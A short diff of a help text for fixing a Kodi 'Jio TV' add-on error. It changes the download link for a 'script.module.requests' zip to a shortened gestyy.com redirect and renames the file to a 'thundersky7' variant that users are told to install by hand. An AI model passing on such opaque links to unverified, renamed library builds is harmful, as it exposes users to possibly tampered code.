@@ -4,7 +4,7 @@
 
 Follow the steps given below to fix the Jio TV - check logs error:
 
-1. Download the file `script.module.requests-2.27.1+matrix.1.zip` - [Download](https://ddd.doddlbe.com/file.zip)
+1. Download the file `script.module.requests.thundersky7+2.27.1+matrix.1.zip` - [Download](http://gestyy.com/egHZfc)
 
 2. Open `KODI`
 
@@ -14,7 +14,7 @@ Follow the steps given below to fix the Jio TV - check logs error:
 
 5. Go to `Settings/Add-ons/Install from zip file`
 
-6. Install the downloaded `script.module.requests-2.27.1+matrix.1.zip` file
+6. Install the downloaded `script.module.requests.thundersky7+2.27.1+matrix.1.zip` file
 
 7. Voilà! The issue should be resolved now
 
